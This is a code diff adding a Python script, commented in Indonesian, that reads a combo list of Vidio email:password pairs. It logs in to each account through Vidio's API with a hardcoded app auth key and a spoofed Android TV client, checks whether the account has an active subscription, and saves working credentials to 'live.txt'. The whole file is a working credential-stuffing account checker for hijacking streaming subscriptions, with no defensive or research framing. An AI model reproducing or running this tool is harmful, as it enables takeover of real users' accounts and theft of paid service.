@@ -1,0 +1,126 @@
+import requests
+from colorama import Fore, init
+import uuid
+import os
+import re
+
+# ----------------- Variabel Tambahan -----------------
+
+userAgent_vidio = "Vidio/5.86.0 (Android 10; POCO F3)"
+xApiInfo_vidio = "5.86.0;Android;10"
+
+def session_id():
+    return str(uuid.uuid4())
+
+# ----------------- Fungsi Login -----------------
+
+def fungsi_login(email, password, user_token=None, user_auth_email=None):
+    headers = {
+        "X-Api-Platform": "tv-android",
+        "X-Api-Auth": "laZOmogezono5ogekaso5oz4Mezimew1",
+        "User-Agent": userAgent_vidio,
+        "X-Api-App-Info": xApiInfo_vidio,
+        "Accept-Language": "en",
+        "X-Visitor-Id": session_id(),
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept-Encoding": "gzip"
+    }
+
+    if user_token and user_auth_email:
+        headers["X-User-Email"] = user_auth_email
+        headers["X-User-Token"] = user_token
+
+    url = "https://www.vidio.com/api/login"
+    param = {
+        "login": email,
+        "password": password
+    }
+
+    response = requests.post(url, headers=headers, data=param)
+
+    if response.status_code != 200:
+        print(Fore.RED + f"Login gagal untuk {email}")
+        return None
+
+    return response
+
+# ----------------- Fungsi Get Subs -----------------
+
+def fungsi_get_subs(user_token, email):
+    headers = {
+        "X-Api-Platform": "tv-android",
+        "X-Api-Auth": "laZOmogezono5ogekaso5oz4Mezimew1",
+        "User-Agent": userAgent_vidio,
+        "X-Api-App-Info": xApiInfo_vidio,
+        "Accept-Language": "id",
+        "X-User-Email": email,
+        "X-User-Token": user_token,
+        "Accept-Encoding": "gzip"
+    }
+
+    url = "https://api.vidio.com/api/users/subscriptions"
+
+    response = requests.get(url, headers=headers)
+
+    try:
+        product_catalog = response.json()['subscriptions'][0]["product_catalog"]["code"]
+        return product_catalog
+    except (KeyError, IndexError):
+        return None
+
+# ----------------- Simpan ke file anti duplikat -----------------
+
+def save_to_file(email, password, filename="live.txt"):
+    entry = f"{email}:{password}"
+    if os.path.exists(filename):
+        with open(filename, "r") as f:
+            data = f.read().splitlines()
+        if entry in data:
+            print(Fore.YELLOW + f"{email} sudah ada di file, skip...")
+            return
+    with open(filename, "a") as f:
+        f.write(entry + "\n")
+    print(Fore.GREEN + f"{email} berhasil disimpan.")
+
+# ----------------- Baca Akun dari file & Regex -----------------
+
+def proses_akun(file_akun="akun.txt"):
+    with open(file_akun, "r") as f:
+        lines = f.read().splitlines()
+
+    pattern = re.compile(r"https?://(?:www\.|m\.)?vidio\.com:(.+?):(.+)")
+    
+    for line in lines:
+        match = pattern.match(line)
+        if not match:
+            print(Fore.RED + f"Format salah: {line}")
+            continue
+
+        email = match.group(1).strip()
+        password = match.group(2).strip()
+
+        print(Fore.CYAN + f"\n[•] Proses login {email}")
+
+        login_response = fungsi_login(email=email, password=password)
+        if login_response:
+            data = login_response.json()
+            user_token = data.get("user", {}).get("user_token")
+            user_email = data.get("user", {}).get("email")
+
+            if user_token and user_email:
+                subs = fungsi_get_subs(user_token, user_email)
+                if subs:
+                    print(Fore.GREEN + f"[✓] {email} Langganan Aktif ({subs})")
+                    save_to_file(email, password)
+                else:
+                    print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
+            else:
+                print(Fore.RED + "Token atau email tidak ditemukan di response.")
+        else:
+            print(Fore.RED + f"Login gagal untuk {email}")
+
+# ----------------- Run -----------------
+
+if __name__ == "__main__":
+    init(autoreset=True)
+    proses_akun("akun.txt")
